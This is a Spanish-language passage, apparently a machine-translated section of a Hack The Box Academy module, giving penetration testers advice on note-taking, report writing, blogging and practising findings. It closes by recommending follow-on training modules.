- Experimente con varias herramientas de toma de notas diferentes mientras juega cajas HTB activas y retiradas, End Games, Pro Labs, módulos de la Academia y otros contenidos de capacitación. Registre su enumeración, explotación, post-explotación, hallazgos, escaneos, etc., con el mayor detalle posible.
    
- Practique acercarse a cajas y laboratorios individuales como si fueran un compromiso del mundo real y use plantillas de informes para practicar la redacción de informes profesionales. Puede usar la plantilla de informe proporcionada con este módulo, encontrar informes de pentest de muestra en GitHub o usar las plantillas de informe incluidas en herramientas como [EscribeQue](https://github.com/blacklanternsecurity/writehat), [Pwndoc](https://github.com/pwndoc/pwndoc)o algo similar.
    
- Lea los informes en el [informes pentesting públicos repo](https://github.com/juliocesarfort/public-pentesting-reports) para exponerse a varios estilos de informes.
    
- Si no tiene tiempo para crear un informe completo para cada caja que toque, al menos, elija 1-2 vulnerabilidades en la caja o el laboratorio y escríbalas como hallazgos profesionales en sus notas. Haga esto suficientes veces, y tendrá los ingredientes de una base de datos de hallazgos sólida.
    
- Inicie un blog personal y realice recorridos o cajas y desafíos HTB retirados, módulos de nivel 0 y CTF en los que participe. Escribe sobre vulnerabilidades y técnicas que te interesen, incluso si ya existen otras publicaciones de blog sobre el tema. Crear publicaciones bien pensadas sobre sus tecnologías favoritas, videojuegos o intereses personales es otra excelente manera de practicar sus habilidades de escritura. Su blog puede ser algo que los empleadores potenciales encuentran o un gran activo para agregar al solicitar un trabajo.
    
- Comparta sus escritos con amigos, compañeros y colegas y pídales comentarios y cómo puede mejorar.
    
- Encuentre blogs de otras personas cuyo estilo de escritura disfrute y lea sus publicaciones regularmente para obtener diferentes puntos de vista sobre cómo las personas abordan los problemas y obtienen ideas sobre diferentes formas de describir hallazgos, conceptos e ideas. Leer puede ayudarnos a crecer como escritores.
    
- Puede ser muy beneficioso usar GitHub Pages y un flujo de trabajo de Git para documentar proyectos personales, familiarizarse con Git y practicar una documentación exhaustiva.
    

Convertirse en un buen escritor puede ayudarlo en muchos aspectos de su carrera. La comunicación escrita profesional no es una habilidad que puedes aprender de la noche a la mañana y algo que solo puedes mejorar con una práctica considerable. Las habilidades profesionales de escritura pueden elevarte a nuevas alturas y hacerte más efectivo en casi todos los roles que asumes en tu carrera, incluso si no son pruebas de penetración o incluso como consultor; ¡tal vez incluso estarás escribiendo módulos de HTB Academy algún día!

---

## Próximos Pasos

Después de este módulo, recomiendo completar el `Penetration Testing Process` módulo (si aún no lo ha hecho) para comprender mejor la imagen más grande y cómo cada módulo en el `Penetration Tester` el camino encaja. Finalmente, completa el `Attacking Enterprise Networks` módulo. Esto se puede considerar el módulo capstone para el `Penetration Tester` traza y reúne las habilidades que se enseñan en cada módulo en una Prueba de Penetración Externa simulada que resulta en un compromiso interno. Acérquese a la red en este módulo como una prueba de penetración en el mundo real y practique sus habilidades de documentación e informes.

[Anterior](https://academy.hackthebox.com/module/162/section/1572)